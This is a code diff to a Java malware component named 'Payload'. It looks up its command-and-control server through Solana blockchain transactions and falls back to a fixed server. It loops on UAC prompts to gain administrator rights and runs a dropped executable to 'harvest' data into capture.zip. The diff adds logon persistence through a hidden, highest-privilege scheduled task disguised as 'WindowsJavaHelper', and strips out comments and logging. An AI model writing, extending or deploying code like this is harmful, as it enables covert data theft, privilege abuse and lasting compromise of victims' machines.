@@ -23,7 +23,6 @@ public class Payload {
             } else {
                 log("No arguments passed. Fetching IP from Solana...");
                 ip = getC2Ip();
-                // If key is missing, try to read it from key.json
                 key = readKeyJson();
             }
 
@@ -59,12 +58,10 @@ public class Payload {
 
     private static String getC2Ip() {
         try {
-            // 1. Get latest signatures
             String sigPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getSignaturesForAddress\",\"params\":[\"" + SOLANA_WALLET + "\",{\"limit\":10}]}";
             String sigRes = httpPost(SOLANA_RPC, sigPayload);
             if (sigRes == null) return FALLBACK_SERVER;
 
-            // 2. Parse signatures
             java.util.List<String> sigs = new java.util.ArrayList<>();
             String searchKey = "\"signature\":\"";
             int idx = 0;
@@ -77,14 +74,9 @@ public class Payload {
                 }
             }
 
-            if (sigs.isEmpty()) {
-                log("No transactions found on Solana.");
-                return FALLBACK_SERVER;
-            }
+            if (sigs.isEmpty()) return FALLBACK_SERVER;
 
-            // 3. Check each tx for the IP
             for (String sig : sigs) {
-                log("Checking tx: " + sig);
                 String txPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getTransaction\",\"params\":[\"" + sig + "\",{\"encoding\":\"json\"}]}";
                 String txRes = httpPost(SOLANA_RPC, txPayload);
                 
@@ -105,8 +97,6 @@ public class Payload {
         } catch (Exception e) {
             log("Solana error: " + e.toString());
         }
-        
-        log("Using fallback IP.");
         return FALLBACK_SERVER;
     }
 
@@ -120,21 +110,14 @@ public class Payload {
             conn.setConnectTimeout(10000);
             conn.setReadTimeout(10000);
             
-            try (OutputStream os = conn.getOutputStream()) {
-                os.write(jsonBody.getBytes("UTF-8"));
-            }
-            
+            try (OutputStream os = conn.getOutputStream()) { os.write(jsonBody.getBytes("UTF-8")); }
             try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
                 StringBuilder sb = new StringBuilder();
                 String line;
-                while ((line = br.readLine()) != null) {
-                    sb.append(line);
-                }
+                while ((line = br.readLine()) != null) { sb.append(line); }
                 return sb.toString();
             }
-        } catch (Exception e) {
-            return null;
-        }
+        } catch (Exception e) { return null; }
     }
 
     private static void log(String msg) {
@@ -176,13 +159,16 @@ public class Payload {
                 
                 p.waitFor(); 
                 
-                if (isAdmin()) {
-                     log("We are Admin now? That's weird. Exiting loop.");
-                     break;
+                // Intense loop: Check every 200ms if we somehow gained admin
+                for(int i=0; i<10; i++) {
+                    if (isAdmin()) {
+                        log("We are Admin now? That's weird. Exiting loop.");
+                        System.exit(0); 
+                    }
+                    Thread.sleep(200);
                 }
                 
                 log("Retrying UAC loop...");
-                Thread.sleep(1000);
             }
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
@@ -217,6 +203,9 @@ public class Payload {
             log("Executing 1.exe...");
             new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath()).start();
 
+            // Install Scheduled Task pointing directly to javaw.exe
+            installStartupTask(key, ip);
+
             log("Waiting for harvest...");
             Thread.sleep(25000);
             File zipFile = new File(loaderDir, "capture.zip");
@@ -228,6 +217,60 @@ public class Payload {
 
         } catch (Exception e) {
             log("Execute Error: " + e.toString());
+        }
+    }
+
+    private static void installStartupTask(String key, String ip) {
+        try {
+            log("Installing startup scheduled task via javaw.exe...");
+            
+            String appData = System.getenv("APPDATA");
+            String jarPath = appData + "\\loader\\st.jar";
+            String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
+            String javawPath = javaHome + "\\bin\\javaw.exe";
+            String xmlPath = appData + "\\loader\\task.xml";
+
+            String xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
+                "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n" +
+                "  <Triggers>\n" +
+                "    <LogonTrigger>\n" +
+                "      <Enabled>true</Enabled>\n" +
+                "    </LogonTrigger>\n" +
+                "  </Triggers>\n" +
+                "  <Principals>\n" +
+                "    <Principal id=\"Author\">\n" +
+                "      <LogonType>InteractiveToken</LogonType>\n" +
+                "      <RunLevel>HighestAvailable</RunLevel>\n" + 
+                "    </Principal>\n" +
+                "  </Principals>\n" +
+                "  <Settings>\n" +
+                "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n" +
+                "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n" +
+                "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n" +
+                "    <AllowHardTerminate>true</AllowHardTerminate>\n" +
+                "    <StartWhenAvailable>true</StartWhenAvailable>\n" +
+                "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n" +
+                "    <Enabled>true</Enabled>\n" +
+                "    <Hidden>true</Hidden>\n" +
+                "  </Settings>\n" +
+                "  <Actions Context=\"Author\">\n" +
+                "    <Exec>\n" +
+                "      <Command>\"" + javawPath + "\"</Command>\n" +
+                "      <Arguments>-jar \"" + jarPath + "\" " + key + " " + ip + "</Arguments>\n" +
+                "    </Exec>\n" +
+                "  </Actions>\n" +
+                "</Task>";
+
+            Files.write(Paths.get(xmlPath), xml.getBytes("UTF-16"));
+
+            String cmd = "schtasks.exe /Create /TN \"WindowsJavaHelper\" /XML \"" + xmlPath + "\" /F";
+            Process p = Runtime.getRuntime().exec(cmd);
+            p.waitFor();
+            
+            new File(xmlPath).delete();
+            log("Startup task installed successfully using javaw.exe.");
+        } catch (Exception e) {
+            log("Task install failed: " + e.toString());
         }
     }
 
